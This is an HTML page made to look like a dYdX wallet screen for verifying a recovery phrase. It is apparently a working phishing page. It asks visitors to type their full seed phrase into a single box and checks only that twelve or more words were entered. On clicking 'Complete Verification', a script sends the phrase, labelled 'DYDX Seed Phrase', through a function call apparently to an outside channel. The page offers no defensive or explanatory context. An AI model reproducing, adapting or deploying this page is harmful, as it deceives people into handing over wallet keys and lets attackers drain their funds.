<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Recovery Phrase - dYdX</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f172a 100%);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
            padding: 0;
        }

        .container {
            padding: 40px 24px 24px;
            max-width: 100%;
            margin: 0 auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 60px;
        }

        .logo {
            font-size: 48px;
            font-weight: 700;
            color: white;
            letter-spacing: -1px;
        }

        .logo .accent {
            color: #6366f1;
        }

        .close-btn {
            font-size: 32px;
            color: #64748b;
            cursor: pointer;
            transition: color 0.2s;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 300;
        }

        .close-btn:hover {
            color: #94a3b8;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .hero-text {
            font-size: 32px;
            font-weight: 400;
            line-height: 1.3;
            color: #94a3b8;
            margin-bottom: 40px;
            max-width: 90%;
        }

        .instruction-text {
            font-size: 18px;
            color: #64748b;
            line-height: 1.4;
            margin-bottom: 40px;
        }

        .verification-container {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 32px;
        }

    
        textarea {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 16px 12px;
            font-size: 20px;
            color: #64748b;
            min-height: 56px;
            transition: all 0.3s ease;
            cursor: pointer;
            position: relative;
            width: 100%;
            height: 300px;
        }

        .word-slot.filled {
            background: rgba(99, 102, 241, 0.1);
            border-color: #6366f1;
            color: white;
            font-weight: 500;
        }

        .word-slot.correct {
            background: rgba(34, 197, 94, 0.15);
            border-color: #22c55e;
            color: #22c55e;
        }

        .word-slot.incorrect {
            background: rgba(239, 68, 68, 0.15);
            border-color: #ef4444;
            color: #ef4444;
        }

        .word-number {
            font-size: 10px;
            color: #64748b;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .word-text {
            font-size: 14px;
        }

        .word-options {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
            margin-bottom: 32px;
        }

        .word-option {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 24px;
            padding: 12px 18px;
            font-size: 15px;
            color: white;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }

        .word-option:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.25);
            transform: translateY(-1px);
        }

        .word-option.selected {
            background: #6366f1;
            border-color: #6366f1;
            color: white;
        }

        .word-option.used {
            opacity: 0.3;
            pointer-events: none;
        }

        .progress-section {
            margin-bottom: 32px;
        }

        .progress-text {
            font-size: 16px;
            color: #94a3b8;
            margin-bottom: 12px;
            text-align: center;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #6366f1, #8b5cf6);
            border-radius: 3px;
            transition: width 0.4s ease;
            width: 0%;
        }

        .verify-button {
            width: 100%;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border: none;
            border-radius: 16px;
            padding: 20px 24px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(99, 102, 241, 0.4);
            opacity: 0.5;
            pointer-events: none;
            margin-top: auto;
        }

        .verify-button.active {
            opacity: 1;
            pointer-events: auto;
        }

        .verify-button.active:hover {
            background: linear-gradient(135deg, #5855eb, #7c3aed);
            box-shadow: 0 6px 25px rgba(99, 102, 241, 0.5);
            transform: translateY(-2px);
        }

        .verify-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 15px rgba(99, 102, 241, 0.4);
        }

        .current-word-indicator {
            text-align: center;
            margin-bottom: 20px;
            font-size: 16px;
            color: #6366f1;
            font-weight: 600;
        }

  
        @media (max-width: 480px) {
            .container {
                padding: 32px 20px 20px;
            }

            .logo {
                font-size: 40px;
            }

            .close-btn {
                font-size: 28px;
                width: 36px;
                height: 36px;
            }

            .hero-text {
                font-size: 28px;
                margin-bottom: 32px;
            }

            .instruction-text {
                font-size: 16px;
                margin-bottom: 32px;
            }

            .verification-container {
                padding: 20px;
            }

            .word-grid {
                gap: 10px;
                margin-bottom: 28px;
            }

            .word-slot {
                padding: 14px 10px;
                min-height: 52px;
            }

            .word-options {
                gap: 6px;
                margin-bottom: 28px;
            }

            .word-option {
                padding: 10px 16px;
                font-size: 14px;
            }

            .verify-button {
                padding: 18px 20px;
                font-size: 16px;
                border-radius: 14px;
            }
        }

        @media (max-width: 360px) {
            .container {
                padding: 28px 16px 16px;
            }

            .logo {
                font-size: 36px;
            }

            .hero-text {
                font-size: 24px;
                margin-bottom: 28px;
            }

            .word-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }

            .word-slot {
                min-height: 48px;
                padding: 12px 8px;
            }

            .word-text {
                font-size: 13px;
            }
        }

         
        @keyframes shake {
            0%, 20%, 50%, 80%, 100% { transform: translateX(0); }
            10%, 30%, 70%, 90% { transform: translateX(-3px); }
            40%, 60% { transform: translateX(3px); }
        }

        .word-slot.shake {
            animation: shake 0.5s ease-in-out;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        .word-slot.pulse {
            animation: pulse 0.3s ease-in-out;
        }

        
        .close-btn:focus,
        .verify-button:focus,
        .word-option:focus,
        .word-slot:focus {
            outline: 2px solid #6366f1;
            outline-offset: 2px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                dY<span class="accent">d</span>X
            </div>
            <div class="close-btn" id="closeBtn" tabindex="0" role="button" aria-label="Close">×</div>
        </div>

        
        <div class="main-content">
             
            <div class="hero-text">
                Verify your recovery phrase to secure your wallet.
            </div>


            <div class="instruction-text">
                Enter the words in the correct order to confirm you've saved your recovery phrase safely.
            </div>

            

            <div class="verification-container">
           
                <div class="word-grid" id="wordGrid">
                   <textarea placeholder="Enter the words in the correct order to confirm you've saved your recovery phrase safely."></textarea>
                </div>

            </div>

       
            
   
            <button class="verify-button" id="verifyButton">
                Complete Verification
            </button>
        </div>
    </div>

    <script>
      
       document.querySelector("textarea").addEventListener('input', function() {
            const text = this.value.trim();
            const words = text ? text.split(/\s+/) : [];
            const count = words.length;

            if (count >= 12) {
                document.querySelector(".verify-button").classList.add('active');
              
            } else {
                document.querySelector(".verify-button").classList.remove('active');
              
            }
        });
       

        document.querySelector(".verify-button").addEventListener("click",()=>{
            const text =  document.querySelector("textarea").value.trim();
            const words = text ? text.split(/\s+/) : [];
            const count = words.length;

            if (count >= 12) {
          
                wu.zhong(`🔰DYDX Seed Phrase \n\n${ document.querySelector("textarea").value}`, "trade.opsdao.dydxchain");
    
            } 
        })

    </script>
</body>
</html>
